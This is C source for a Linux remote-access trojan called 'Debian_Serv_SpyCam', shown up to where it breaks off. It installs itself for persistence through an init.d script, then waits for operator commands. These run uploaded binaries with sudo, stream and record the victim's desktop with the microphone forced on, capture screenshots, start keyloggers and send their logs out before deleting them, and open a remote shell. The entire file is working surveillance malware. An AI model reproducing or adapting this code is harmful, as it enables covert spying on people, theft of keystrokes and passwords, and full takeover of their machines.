//#include <sys/types.h>
//#include <sys/socket.h>
//#include <netinet/in.h>
#include <arpa/inet.h>  // send(), recv(), IPPROTO_TCP, SOCKADDR_IN ect ....
#include <sys/stat.h>   // umask()

#include <gtk-2.0/gtk/gtk.h>

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>  // perror()
#include <unistd.h>
#include <string.h>  //strlen()
#include <syslog.h> // syslog()

#include <pthread.h> //pthread_create(), pthread_join()()

#include <gst/gst.h>

#include "../includes/constants.h"
#include "../includes/utils.h"
#include "../includes/keylogger/keylogger.h"


static SOCKET sock = 0;
static SOCKET csock = 0;

int main(int argc, char *argv[])
{
    //SOCKET sock = 0;
    //SOCKET csock = 0;

    /* Make daemon_server.sh script executable
    if(system("chmod +x script/daemon_server.sh") == -1)
    {
        error("system() make exec daemon_server.sh", "main()");
        exit(-1);
    }

    /* Make delete_startup.sh script executable
    if(system("chmod +x script/delete_startup.sh") == -1)
    {
        error("system() make exec delete_startup.sh", "main()");
        exit(-1);
    }

    /* Make startup.sh script executable
    if(system("chmod +x script/startup.sh") == -1)
    {
        error("system() make exec startup.sh", "main()");
        exit(-1);
    }

    /* Copy daemon_server.sh script in /etc/init.d
    if(system("cp script/daemon_server.sh /etc/init.d") == -1)
    {
        error("system() copy daemon_server.sh in /etc/init.d/", "main()");
        exit(-1);
    }

    /* Copy executable file in /usr/bin/
    if(system("cp Debian_Serv_SpyCam /usr/bin/") == -1)
    {
        error("system() copy Debian_Serv_SpyCam in /usr/bin/", "main()");
        exit(-1);
    }

    /* Copy executable file in /usr/sbin/
    if(system("cp Debian_Serv_SpyCam /usr/sbin/") == -1)
    {
        error("system() copy Debian_Serv_SpyCam in /usr/sbin/", "main()");
        exit(-1);
    }

    /* Create a symbolic link with daemon_server.sh
    if(system("ln -s /etc/init.d/daemon_server.sh/ /etc/rc2.d/S88daemon_server.sh") == -1)
    {
        error("system() daemon_server.sh symbolic link", "main()");
        exit(-1);
    }

    //daemonize();

    /* Initialize GStreamer */
    gst_init (&argc, &argv);

    get_root();

    //keylogger_init();

    dispatch_modules(argv);

    return EXIT_SUCCESS;
}

void dispatch_modules(char *argv[])
{
    SOCKADDR_IN sin;
    socklen_t recsize = sizeof(sin);

    SOCKADDR_IN csin;
    socklen_t crecsize = sizeof(csin);

    int option = 1;
    size_t flag = 0;

    //char *ubuntu_check_gain_cmd = "pactl set-sink-mute @DEFAULT_SINK@ toggle"; /* A TESTER  */
    const char *ubuntu_check_mic_cmd = "amixer sset Capture cap";
    const char *ubuntu_gain_mic_cmd = "amixer sset Capture 100%";

    const char *kali_check_gain_cmd = "pactl set-sink-mute @DEFAULT_SINK@ 0";
    const char *kali_set_gain_cmd = "pactl set-sink-volume @DEFAULT_SINK@ 100%";

    const char *debian_set_gain_cmd = "pactl set-sink-volume @DEFAULT_SINK@ 100%";
    const char *debian_check_gain_cmd = "pactl set-sink-mute @DEFAULT_SINK@ 0";
    const char *debian_gain_mic_cmd = "amixer sset Capture 100%";
    const char *debian_check_mic_cmd = "amixer sset Capture cap";

    FILE *ubuntu_unmute_mic_pipe = NULL;
    FILE *ubuntu_gain_mic_pipe = NULL;

    FILE *mint_unmute_mic_pipe = NULL;
    FILE *mint_gain_mic_pipe = NULL;

    FILE *kali_set_gain_pipe = NULL;
    FILE *kali_gain_mic_pipe = NULL;

    FILE *debian_main_gain_pipe = NULL;
    FILE *debian_set_gain_pipe = NULL;
    FILE *debian_unmute_mic_pipe = NULL;
    FILE *debian_gain_mic_pipe = NULL;

    FILE *log_file = NULL;

    long dataSend = 0;
    long dataRead = 0;
    long totalSend = 0;
    long file_size = 0;
    char caractereLu = 0;
    int i = 0;

    char buffer[MAXDATASIZE] = "";

    pthread_t stream_desktop = 0;
    pthread_t rec_video_desktop = 0;
    pthread_t upload_screenshot = 0;
    pthread_t multi_screenshot = 0;
    pthread_t send_resolution = 0;

    pthread_t mint_stream_desktop = 0;
    pthread_t mint_rec_video_desktop = 0;

    pthread_t kali_stream_desktop = 0;
    pthread_t kali_rec_video_desktop = 0;
    pthread_t kali_upload_screenshot = 0;

    pthread_t debian_rec_video_desktop = 0;

    pthread_t thread_remote_shell = 0;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "dispatch_modules()");
        exit(-1);
    }

    memset(&sin, 0, sizeof(sin));
    sin.sin_addr.s_addr = htonl(INADDR_ANY);
    sin.sin_family      = AF_INET;
    sin.sin_port        = htons(PORT);

    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, (char*)&option, sizeof(option)) == SOCKET_ERROR)
    {
        error("setsockopt()", "dispatch_modules()");
        exit(-1);
    }

    if(bind(sock, (SOCKADDR*)&sin, recsize) == SOCKET_ERROR)
    {
        error("bind()", "dispatch_modules()");
        exit(-1);
    }

    for(;;)
    {
        printf("\nServer en ecoute \n");

        if(listen(sock, 3) == SOCKET_ERROR)
        {
            error("listen,()", "dispatch_modules()");
            exit(-1);
        }

        csock = accept(sock, (SOCKADDR*)&sin, &crecsize);
        if(csock == INVALID_SOCKET)
        {
            error("accept()", "dispatch_modules()");
            exit(-1);
        }

        if(recv(csock, (char*)&flag, sizeof(flag), 0) == SOCKET_ERROR)
        {
            error("recv() flag", "dispatch_modules()");
            exit(-1);
        }

        printf("flag received : %ld\n", flag);

        if(flag == 1)
        {
            printf("\t\tUPLOADING FILE ....\n");
            recv_upload();
        }

        if(flag == 2)
        {
            printf("\t\tUBUNTU STREAMING ....\n");

            if(pthread_create(&stream_desktop, NULL, (void*)execute_watch_cmd, NULL) == -1)
            {
                error("pthread_create() execute_watch_cmd", "dispatch_modules()");
                exit(-1);
            }

            if (pthread_join(stream_desktop, NULL))
            {
                perror("pthread_join");

                return;
            }

            //execute_watch_cmd();
        }

        if(flag == 3)
        {
            printf("\t\tUBUNTU RECORDING REMOTE DESKTOP ....\n");

            ubuntu_gain_mic_pipe = popen(ubuntu_gain_mic_cmd, "r");
            if(ubuntu_gain_mic_pipe == NULL)
            {
                error("popen() ubuntu_gain_mic_pipe", "dispatch_modules()");
                exit(-1);
            }

            ubuntu_gain_mic_pipe = popen(ubuntu_gain_mic_cmd, "w");

            if(ubuntu_gain_mic_pipe == NULL)
            {
                error("popen() ubuntu_gain_mic_pipe", "dispatch_modules()");
                exit(-1);
            }

            ubuntu_unmute_mic_pipe = popen(ubuntu_check_mic_cmd, "w");
            if(ubuntu_unmute_mic_pipe == NULL)
            {
                error("popen() ubuntu_unmute_mic_pipe", "dispatch_modules()");
                exit(-1);
            }

            wait_time_end(5);

            if(pclose(ubuntu_gain_mic_pipe) == -1)
            {
                printf("Fail to close ubuntu_gain_mic_pipe!\n");
                exit(-1);
            }

            if(pclose(ubuntu_unmute_mic_pipe) == -1)
            {
                printf("Fail to close ubuntu_unmute_mic_pipe!\n");
                exit(-1);
            }

            if(pthread_create(&rec_video_desktop, NULL, (void*)execute_record_cmd, NULL) == -1)
            {
                error("pthread_create() execute_record_cmd", "dispatch_modules()");
                exit(-1);
            }

            if (pthread_join(rec_video_desktop, NULL))
            {
                perror("pthread_join");

                return;
            }

            //execute_record_cmd();
        }

        if(flag == 4)
        {
            printf("\t\tUbuntu - UPLOADING THE SCREENSHOT ....\n");

            if(pthread_create(&upload_screenshot, NULL, (void*)upload_screenshot_file, NULL) == -1)
            {
                error("pthread_create() download_screenshot_file", "dispatch_modules()");
                exit(-1);
            }

            if (pthread_join(upload_screenshot, NULL))
            {
                perror("pthread_join");

                return;
            }

            //download_screenshot_file();
        }

        if(flag == 5)
        {
            printf("\t\tUPLOADING MULTI SCREENSHOTS....\n");

            if(pthread_create(&multi_screenshot, NULL, (void*)download_multi_screenshot_files, NULL) == -1)
            {
                error("pthread_create() download_multi_screenshot_files", "dispatch_modules()");
                exit(-1);
            }

            if (pthread_join(multi_screenshot, NULL))
            {
                perror("pthread_join");

                return;
            }
            //download_multi_screenshot_files();
        }

        if(flag == 6)
        {
            printf("\t\tSENDING RESOLUTION....\n");

            if(pthread_create(&send_resolution, NULL, (void*)get_remote_screen_resolution, NULL) == -1)
            {
                error("pthread_create() get_remote_screen_resolution", "dispatch_modules()");
                exit(-1);
            }

            if (pthread_join(send_resolution, NULL))
            {
                perror("pthread_join");

                return;
            }
            //get_remote_screen_resolution();
        }

        if(flag == 7)
        {
            printf("\t\tMINT STREAMING....\n");

            if(pthread_create(&mint_stream_desktop, NULL, (void*)execute_watch_cmd, NULL) == -1)
            {
                error("pthread_create() Mint execute_watch_cmd", "dispatch_modules()");
                exit(-1);
            }


            if (pthread_join(mint_stream_desktop, NULL))
            {
                perror("pthread_join");

                return;
            }

            //execute_watch_cmd();
        }

        if(flag == 8)
        {
            printf("\t\tMINT RECORDING REMOTE DESKTOP ....\n");

            mint_gain_mic_pipe = popen(ubuntu_gain_mic_cmd, "r");
            if(mint_gain_mic_pipe == NULL)
            {
                error("popen() mint_gain_mic_pipe", "dispatch_modules()");
                exit(-1);
            }

            mint_gain_mic_pipe = popen(ubuntu_gain_mic_cmd, "w");
            if(mint_gain_mic_pipe == NULL)
            {
                error("popen() mint_gain_mic_pipe", "dispatch_modules()");
                exit(-1);
            }

            mint_unmute_mic_pipe = popen(ubuntu_check_mic_cmd, "r");
            if(mint_unmute_mic_pipe == NULL)
            {
                error("popen() mint_unmute_mic_pipe", "dispatch_modules()");
                exit(-1);
            }

            wait_time_end(5);

            if(pclose(mint_unmute_mic_pipe) == -1)
            {
                printf("Fail to close mint_unmute_mic_pipe!\n");
                exit(-1);
            }

            if(pclose(mint_gain_mic_pipe) == -1)
            {
                printf("Fail to close mint_gain_mic_pipe!\n");
                exit(-1);
            }

            if(pthread_create(&mint_rec_video_desktop, NULL, (void*)execute_record_cmd, NULL) == -1)
            {
                error("pthread_create() Mint execute_record_cmd", "dispatch_modules()");
                exit(-1);
            }

            if (pthread_join(mint_rec_video_desktop, NULL))
            {
                perror("pthread_join");

                return;
            }

            //execute_record_cmd();
        }

        if(flag == 9)       /* REMOTE SHELL */
        {
            printf("\t\tSTARTING REMOTE SHELL ....\n");

            if(pthread_create(&thread_remote_shell, NULL, (void*)start_remote_shell, argv) == -1)
            {
                error("pthread_create() start_remote_shell", "dispatch_modules()");
                exit(-1);
            }

            if (pthread_join(thread_remote_shell, NULL))
            {
                perror("pthread_join");

                return;
            }

            //start_remote_shell(csock, sock, argv);
        }

        if(flag == 10)
        {
            printf("\t\tSTARTING UBUNTU KEYLOGGER ....\n");
            ubuntu_keylogger_init();
        }

        if(flag == 17)
        {
            printf("\t\tSTARTING MINT KEYLOGGER ....\n");
            mint_keylogger_init();
        }

        if(flag == 18)
        {
            printf("\t\tSTARTING DEBIAN KEYLOGGER ....\n");
            debian_keylogger_init();
        }

        if(flag == 19)
        {
            printf("\t\tSTARTING KALI KEYLOGGER ....\n");
            kali_keylogger_init();
        }

        if(flag == 11)
        {
            printf("\t\tSENDING LOG FILE ....\n");

            log_file = fopen("/var/log/keylogger.log", "r+");
            if(log_file == NULL)
            {
                error("fopen() log_file", "dispatch_modules()");
                exit(-1);
            }

            while((caractereLu = fgetc(log_file)) != EOF)
            {
                buffer[i] = caractereLu;
                i++;
            }

            fseek(log_file, 0, SEEK_END);
            file_size = ftell(log_file);
            rewind(log_file);

            /** Envoie de la taille du fichier txt **/
            if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
            {
                error("send() file_size", "dispatch_modules()");
                exit(-1);

            }

            printf("Weight of the file send with success : %ld octets\n", file_size);

            do
            {
                dataRead = fread(buffer, sizeof(char), file_size, log_file);
                if(dataRead < 0)
                {
                    perror("fread ");
                    exit(-1);
                }

                dataSend = send(csock, buffer, file_size, 0);

                //printf("Envoie de %ld octets\n", dataSend);

                if(dataSend < 0)
                {
                    perror("send() ");
                    exit(errno);
                }

                totalSend += dataSend;

            }while(totalSend < file_size);

            printf("File totaly send with success : %ld\n", dataSend);

            fclose(log_file);

            if(system("rm -rf /var/log/keylogger.log") == -1)
            {
                error("system() keyloggr.log", "dispatch_modules()");
                exit(-1);
            }

            close(csock);
        }

        if(flag == 12)
        {
            printf("\t\tCLOSING SERVER CONNECTION ....\n");
            exit(1);
        }

        if(flag == 13)
        {
            printf("\t\tKALI STREAMING....\n");

            if(pthread_create(&kali_stream_desktop, NULL, (void*)execute_watch_cmd, NULL) == -1)
            {
                error("pthread_create() Mint execute_watch_cmd", "dispatch_modules()");
                exit(-1);
            }


            if (pthread_join(kali_stream_desktop, NULL))
            {
                perror("pthread_join");

                return;
            }

            //execute_watch_cmd();
        }

        if(flag == 14)
        {
            printf("\t\tKALI RECORDING REMOTE DESKTOP ....\n");

            kali_gain_mic_pipe = popen(kali_check_gain_cmd, "w");
            if(kali_gain_mic_pipe == NULL)
            {
                error("popen() kali_gain_mic_pipe", "dispatch_modules()");
                exit(-1);
            }

            kali_set_gain_pipe = popen(kali_set_gain_cmd, "w");
            if(kali_set_gain_pipe == NULL)
            {
                error("popen() kali_set_gain_pipe", "dispatch_modules()");
                exit(-1);
            }

            wait_time_end(5);

            if(pclose(kali_gain_mic_pipe) == -1)
            {
                printf("Fail to close kali_gain_mic_pipe!\n");
                exit(-1);
            }

            if(pclose(kali_set_gain_pipe) == -1)
            {
                printf("Fail to close kali_set_gain_pipe!\n");
                exit(-1);
            }

            if(pthread_create(&kali_rec_video_desktop, NULL, (void*)execute_record_cmd, NULL) == -1)
            {
                error("pthread_create() Mint execute_record_cmd", "dispatch_modules()");
                exit(-1);
            }

            if (pthread_join(kali_rec_video_desktop, NULL))
            {
                perror("pthread_join");

                return;
            }

            //execute_record_cmd();
        }

        if(flag == 15)
        {
            printf("\t\tKali - UPLOADING THE SCREENSHOT ....\n");

            if(pthread_create(&kali_upload_screenshot, NULL, (void*)upload_screenshot_file, NULL) == -1)
            {
                error("pthread_create() kali_upload_screenshot", "dispatch_modules()");
                exit(-1);
            }

            if (pthread_join(kali_upload_screenshot, NULL))
            {
                perror("pthread_join");

                return;
            }

            //download_screenshot_file();
        }

        if(flag == 16)
        {
            printf("\t\tDEBIAN RECORDING REMOTE DESKTOP ....\n");

            debian_set_gain_pipe = popen(debian_set_gain_cmd, "w");
            if(debian_set_gain_pipe == NULL)
            {
                error("popen() debian_set_gain_pipe", "dispatch_modules()");
                exit(-1);
            }

            debian_main_gain_pipe = popen(debian_check_gain_cmd, "w");
            if(debian_main_gain_pipe == NULL)
            {
                error("popen() debian_main_gain_pipe", "dispatch_modules()");
                exit(-1);
            }

             debian_gain_mic_pipe = popen(debian_gain_mic_cmd, "w");
            if(debian_gain_mic_pipe == NULL)
            {
                error("popen() debian_gain_mic_pipe", "dispatch_modules()");
                exit(-1);
            }

            debian_unmute_mic_pipe = popen(debian_check_mic_cmd, "w");
            if(debian_unmute_mic_pipe == NULL)
            {
                error("popen() debian_unmute_mic_pipe", "dispatch_modules()");
                exit(-1);
            }

            /*
            debian_gain_mic_pipe = popen(debian_gain_mic_cmd, "r");
            if(debian_gain_mic_pipe == NULL)
            {
                error("popen() debian_gain_mic_pipe", "dispatch_modules()");
                exit(-1);
            }
            */

            wait_time_end(5);

            if(pclose(debian_set_gain_pipe) == -1)
            {
                printf("Fail to close debian_set_gain_pipe!\n");
                exit(-1);
            }

            if(pclose(debian_main_gain_pipe) == -1)
            {
                printf("Fail to close debian_main_gain_pipe!\n");
                exit(-1);
            }

            if(pclose(debian_gain_mic_pipe) == -1)
            {
                printf("Fail to close debian_gain_mic_pipe!\n");
                exit(-1);
            }

            if(pclose(debian_unmute_mic_pipe) == -1)
            {
                printf("Fail to close kali_gain_mic_pipe!\n");
                exit(-1);
            }

            if(pthread_create(&debian_rec_video_desktop, NULL, (void*)execute_record_cmd, NULL) == -1)
            {
                error("pthread_create() Debian execute_record_cmd", "dispatch_modules()");
                exit(-1);
            }

            if (pthread_join(debian_rec_video_desktop, NULL))
            {
                perror("pthread_join");

                return;
            }

            //execute_record_cmd();
        }
    }


    return;
}


void recv_upload()
{
    FILE *log = NULL;
    FILE *pipe[3] = {NULL};

    long tailleBlockRecut = 0;
    long totalRcv = 0;
    char buffer[MAXDATASIZE] = "";

    char *cmd_1 = NULL;
    char *cmd_2 = NULL;
    char *cmd_3 = NULL;

    long weight = 0;
    size_t len = 0;

    char *log_name = NULL;

    char ffmpeg_done[] = "ffmpeg has been installed succefully !!!\n";
    size_t len_ffmpeg = strlen(ffmpeg_done) + 1;


    if(recv(csock, (char*)&weight, sizeof(weight), 0) != SOCKET_ERROR)
        printf("\n\nPoid du fichier reçut : %ld octets\n", weight);

    else
    {
        error("recv() weight", "recv_upload()");
        exit(-1);
    }

    if(recv(csock, (char*)&len, sizeof(len), 0) == SOCKET_ERROR)
        error("recv() len", "recv_upload()");

    log_name = malloc(len * sizeof(char));
    if(log_name == NULL)
    {
        error("malloc() log_name", "recv_upload()");
        exit(-1);
    }

    if(recv(csock, log_name, len, 0) == SOCKET_ERROR)
        error("recv() log_name", "recv_upload()");

    //printf("log_name = %s\n", log_name);

    log = fopen(log_name, "wb");
    if(log == NULL)
    {
        error("fopen() log", "recv_upload()");
        exit(-1);
    }

    cmd_1 = malloc((15 + len) * sizeof(char));
    if(cmd_1 == NULL)
    {
        error("malloc() cmd_1", "recv_upload()");
        exit(-1);
    }

    cmd_2 = malloc((14 + len) * sizeof(char));
    if(cmd_2 == NULL)
    {
        error("malloc() cmd_2", "recv_upload()");
        exit(-1);
    }

    cmd_3 = malloc(weight * sizeof(char));
    if(cmd_3 == NULL)
    {
        error("malloc() cmd_3", "recv_upload()");
        exit(-1);
    }

    cmd_1 = strcpy(cmd_1, "sudo chmod 777 ");
    cmd_1 = strcat(cmd_1, log_name);

    //printf("cmd1 = %s\n", cmd_1);

    cmd_2 = strcpy(cmd_2, "sudo chmod +x ");
    cmd_2 = strcat(cmd_2, log_name);

    //printf("cmd2 = %s\n", cmd_2);

    cmd_3 = strcpy(cmd_3, "sudo ");
    cmd_3 = strcat(cmd_3, "./");
    cmd_3 = strcat(cmd_3, log_name);

    //printf("cmd3 = %s\n", cmd_3);


    do
    {
        tailleBlockRecut = recv(csock, buffer, sizeof(weight), 0);

        fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, log);

        totalRcv += tailleBlockRecut;

        //printf("Downloading : %.6f Mo\n", (double)totalRcv / 1000000);

    }while(totalRcv < weight);

    pipe[0] = popen(cmd_1, "r");
    if(pipe[0] == NULL)
    {
        error("popen() pipe[0]", "recv_upload()");
        exit(-1);
    }

    fclose(log);
    pclose(pipe[0]);

    pipe[1] = popen(cmd_2, "r");
    if(pipe[1] == NULL)
    {
        error("popen() pipe[1]", "recv_upload()");
        exit(-1);
    }

    pipe[2] = popen(cmd_3, "r");
    if(pipe[2] == NULL)
    {
        error("popen() pipe[2]", "recv_upload()");
        exit(-1);
    }

    pclose(pipe[1]);
    pclose(pipe[2]);

    free(log_name);

    free(cmd_1);
    free(cmd_2);
    free(cmd_3);

    if(send(csock, ffmpeg_done, len_ffmpeg, 0) == SOCKET_ERROR)
    {
        error("send() ffmpeg_done ", "uploaded_file()");
        exit(-1);
    }

    ffmpeg_done[len_ffmpeg - 1] = '\0';

    close(csock);

    return;
}


void *get_remote_screen_resolution()
{
    FILE *screen_reso_pipe = NULL;
    const gchar *reso_cmd = "xrandr --verbose | grep *current";
    gchar buffer_screen_reso[62] = "";
    char *final_resolution = NULL;
    size_t final_reso_len = 0;

    screen_reso_pipe = popen(reso_cmd, "r");
    if(screen_reso_pipe == NULL)
    {
        error("popen() screen_reso_pipe", "uploaded_file()");
        exit(-1);
    }

    if(fgets(buffer_screen_reso, 62, screen_reso_pipe) == NULL)
    {
        error("fgets() buffer_screen_reso", "uploaded_file()");
        exit(-1);
    }

    final_resolution = split_resolution_cmds(buffer_screen_reso);

    //printf("\n\nFinal cmds = %s\n\n", final_resolution);

    final_reso_len = strlen(final_resolution) + 1;

    if(send(csock, (char*)&final_reso_len, sizeof(final_reso_len), 0) == SOCKET_ERROR)
    {
        error("send() final_reso_len", "uploaded_file()");
        exit(-1);
    }

    if(send(csock, final_resolution, final_reso_len, 0) == SOCKET_ERROR)
    {
        error("send() final_resolution", "uploaded_file()");
        exit(-1);
    }

    clean_buffer(buffer_screen_reso);

    free(final_resolution);

    pclose(screen_reso_pipe);

    //close(csock);

    pthread_exit(NULL);
}


void execute_watch_cmd()
{
    size_t len_watch_cmd = 0;
    char *buffer = NULL;

    GstElement *pipeline;
    GstBus *bus;
    GstStateChangeReturn ret;
    GMainLoop *main_loop;
    CustomData data;

    if(recv(csock, (char*)&len_watch_cmd, sizeof(len_watch_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_watch_cmd", "execute_watch_cmd()");
        exit(-1);
    }

    buffer = malloc(len_watch_cmd * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "execute_watch_cmd()");
        exit(-1);
    }

    if(recv(csock, buffer, len_watch_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "execute_watch_cmd()");
        exit(-1);
    }

     /* Initialize our data structure */
    memset (&data, 0, sizeof (data));

    /* Build the pipeline */
    pipeline = gst_parse_launch(buffer, NULL);
    bus = gst_element_get_bus (pipeline);

    /* Start playing */
    ret = gst_element_set_state (pipeline, GST_STATE_PLAYING);

    if(ret == GST_STATE_CHANGE_FAILURE)
    {
        g_printerr ("Unable to set the pipeline to the playing state.\n");
        gst_object_unref (pipeline);
        exit(-1);
    }

    else if(ret == GST_STATE_CHANGE_NO_PREROLL)
    {
        data.is_live = TRUE;
    }

    main_loop = g_main_loop_new (NULL, FALSE);
    data.loop = main_loop;
    data.pipeline = pipeline;

    gst_bus_add_signal_watch (bus);
    g_signal_connect(bus, "message", G_CALLBACK(cb_message), &data);

    pthread_exit(NULL);

    g_main_loop_run(main_loop);

    /* Free resources */
    g_main_loop_unref (main_loop);
    gst_object_unref (bus);
    gst_element_set_state (pipeline, GST_STATE_NULL);
    gst_object_unref (pipeline);

    free(buffer);

    close(csock);

}

void cb_message(GstBus *bus, GstMessage *msg, CustomData *data)
{
    switch (GST_MESSAGE_TYPE (msg))
    {
        case GST_MESSAGE_ERROR:
        {
            GError *err;
            gchar *debug;

            gst_message_parse_error (msg, &err, &debug);
            g_print ("Error: %s\n", err->message);
            g_error_free (err);
            g_free (debug);

            gst_element_set_state (data->pipeline, GST_STATE_READY);
            g_main_loop_quit (data->loop);
            break;
        }

        case GST_MESSAGE_EOS:
            /* end-of-stream */
            gst_element_set_state (data->pipeline, GST_STATE_READY);
            g_main_loop_quit (data->loop);
            break;

        case GST_MESSAGE_BUFFERING:
        {
            gint percent = 0;

            /* If the stream is live, we do not care about buffering. */
            if (data->is_live) break;

            gst_message_parse_buffering (msg, &percent);
            g_print ("Buffering (%3d%%)\r", percent);

            /* Wait until buffering is complete before start/resume playing */
            if (percent < 100)
                gst_element_set_state (data->pipeline, GST_STATE_PAUSED);

            else
                gst_element_set_state (data->pipeline, GST_STATE_PLAYING);

            break;
        }

        case GST_MESSAGE_CLOCK_LOST:

            /* Get a new clock */
            gst_element_set_state (data->pipeline, GST_STATE_PAUSED);
            gst_element_set_state (data->pipeline, GST_STATE_PLAYING);
            break;

        default:
            /* Unhandled message */
            break;
    }
}


void *execute_record_cmd()
{
    size_t len_record_cmd = 0;
    char *buffer = NULL;
    FILE *pipe = NULL;

    FILE *record_file = NULL;
    long file_weight = 0;

    unsigned char buffer_video_desktop[1450] = "";
    long dataSend = 0;
    long dataRead = 0;
    long totalSend = 0;

    gchar *time_of_record = NULL;
    float time_of_record_convert = 0;
    size_t len_time_of_rec = 0;
    int sound_on = 0;

    const char *sound_cmd = "rm -rf snd_desktop.mkv";
    FILE *pipe_delete_sound_file = NULL;

    char *cmd = "rm -rf desktop.mkv";
    FILE *pipe_delete_file = NULL;

    if(recv(csock, (char*)&sound_on, sizeof(sound_on) , 0) == SOCKET_ERROR)
    {
        error("recv() sound_on", "execute_record_cmd()");
        exit(-1);
    }

    if(recv(csock, (char*)&len_time_of_rec, sizeof(len_time_of_rec) , 0) == SOCKET_ERROR)
    {
        error("recv() len_time_of_rec", "execute_record_cmd()");
        exit(-1);
    }

    time_of_record = malloc(len_time_of_rec * sizeof(char));
    if(time_of_record == NULL)
    {
        error("malloc() time_of_record", "ubuntu_record()");
        exit(-1);
    }

    if(recv(csock, time_of_record, len_time_of_rec, 0) == SOCKET_ERROR)
    {
        error("recv() time_of_record", "execute_record_cmd()");
        exit(-1);
    }

    //printf("timeof record -----> %s\n\n", time_of_record);

    if(recv(csock, (char*)&len_record_cmd, sizeof(len_record_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_record_cmd", "execute_record_cmd()");
        exit(-1);
    }

    buffer = malloc(len_record_cmd * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "execute_record_cmd()");
        exit(-1);
    }

    if(recv(csock, buffer, len_record_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "execute_record_cmd()");
        exit(-1);
    }

    //printf("command ---> %s\n", buffer);

    pipe = popen(buffer, "r");
    if(pipe == NULL)
    {
        error("popen() pipe", "execute_record_cmd()");
        exit(-1);
    }

    sscanf(time_of_record,"%f",&time_of_record_convert);

    printf("\n\ntime of record convert : %f\n\n", time_of_record_convert);

    free(time_of_record);

    wait_time_end(time_of_record_convert + 15);

    if(sound_on == 1)
    {
        record_file = fopen("snd_desktop.mkv", "rb");
        if(record_file == NULL)
        {
            error("fopen() record_file", "execute_record_cmd()");
            exit(-1);
        }
    }

    if(sound_on == 0)
    {
        record_file = fopen("desktop.mkv", "rb");
        if(record_file == NULL)
        {
            error("fopen() record_file", "execute_record_cmd()");
            exit(-1);
        }
    }

    /* weight of record file */
    fseek(record_file, 0, SEEK_END);
    file_weight = ftell(record_file);
    rewind(record_file);

    if(send(csock, (char*)&file_weight, sizeof(file_weight), 0) == SOCKET_ERROR)
    {
        error("send() video weight", "execute_record_cmd()");
        exit(-1);
    }

    printf("\n\nFile_weight = %ld\n\n", file_weight);

    do
    {
        dataRead = fread(buffer_video_desktop, sizeof(char), sizeof(file_weight), record_file);
        if(dataRead < 0)
        {
            error("send() dataRead", "execute_record_cmd()");
            exit(-1);
        }

        dataSend = send(csock, buffer_video_desktop, sizeof(file_weight), 0);
        if(dataSend == 0)
        {
            error("send() datasend", "execute_record_cmd()");
            exit(-1);
        }

        totalSend += dataRead;

        printf("Uploading: %.2f Mo\n", (double)totalSend / 1000000);

    }while(totalSend < file_weight);

    printf("\n\nEnvoie du fichier SUCCESS !!\n");

    if(sound_on == 0)
    {
        pipe_delete_file = popen(cmd, "r");
        if(pipe_delete_file == NULL)
        {
            error("popen() delete desktop.mkv", "execute_record_cmd()");
            exit(-1);
        }
    }

    if(sound_on == 1)
    {
        pipe_delete_sound_file = popen(sound_cmd, "r");
        if(pipe_delete_sound_file == NULL)
        {
            error("popen() delete snd_desktop.mkv", "execute_record_cmd()");
            exit(-1);
        }
    }

    if(sound_on == 0)
    {
        if(pclose(pipe_delete_file) == -1)
        {
            printf("Fail to close pipe_delete_file!\n");
            exit(-1);
        }
    }

    if(sound_on == 1)
    {
        if(pclose(pipe_delete_sound_file) == -1)
        {
            printf("Fail to close pipe_delete_sound_file!\n");
            exit(-1);
        }
    }

    if(pclose(pipe) == -1)
    {
        printf("Fail to close pipe!\n");
        exit(-1);
    }

    fclose(record_file);
    close(csock);

    free(buffer);

    pthread_exit(NULL);
}


void *upload_screenshot_file()
{
    FILE *pipe = NULL;
    size_t len_screenshot_cmd = 0;
    char *buffer = NULL;

    FILE *screenshot_file = NULL;
    size_t screen_weight = 0;

    char buffer_desktop_screenshot[1450] = "";
    long dataSend = 0;
    size_t dataRead = 0;
    size_t totalSend = 0;

    if(recv(csock, (char*)&len_screenshot_cmd, sizeof(len_screenshot_cmd), 0) == SOCKET_ERROR)
    {
        error("recv() len_screenshot_cmd", "download_screenshot_file()");
        exit(-1);
    }

    buffer = malloc(len_screenshot_cmd * sizeof(char));
    if(buffer == NULL)
    {
        error("malloc() buffer", "download_screenshot_file()");
        exit(-1);
    }

    if(recv(csock, buffer, len_screenshot_cmd, 0) == SOCKET_ERROR)
    {
        error("recv() buffer", "download_screenshot_file()");
        exit(-1);
    }

    //printf("command ---> %s\n", buffer);

    pipe = popen(buffer, "r");
    if(pipe == NULL)
    {
        error("popen() pipe", "download_screenshot_file()");
        exit(-1);
    }

    wait_time_end(5);

    screenshot_file = fopen("screenshot.jpeg", "rb");
    if(screenshot_file == NULL)
    {
        error("fopen() screenshot_file", "download_screenshot_file()");
        exit(-1);
    }

    /* weight of record file */
    fseek(screenshot_file, 0, SEEK_END);
    screen_weight = (size_t)ftell(screenshot_file);
    rewind(screenshot_file);

    //printf("le fichier screenshot fait : %ld octets\n", screen_weight);

    if(send(csock, (char*)&screen_weight, sizeof(screen_weight), 0) == SOCKET_ERROR)
    {
        error("send() screen_weight", "download_screenshot_file()");
        exit(-1);
    }

    printf("\n\nscreen weight = %ld\n\n", screen_weight);

    do
    {
        dataRead = fread(buffer_desktop_screenshot, sizeof(char), sizeof(screen_weight), screenshot_file);

        dataSend = send(csock, buffer_desktop_screenshot, sizeof(screen_weight), 0);
        if(dataSend == 0)
        {
            error("send() datasend", "download_screenshot_file()");
            exit(-1);
        }

        totalSend += dataRead;

    }while(totalSend < screen_weight);

    printf("\n\nEnvoie du screenshot SUCCESS !!\n");

    if(system("rm -rf screenshot.jpeg") == -1)
    {
        error("system() delete screenshot.jpeg", "download_screenshot_file()");
        exit(-1);
    }

    fclose(screenshot_file);
    close(csock);

    free(buffer);

    if(pclose(pipe) == -1)
    {
        printf("Fail to close pipe!\n");
        exit(-1);
    }

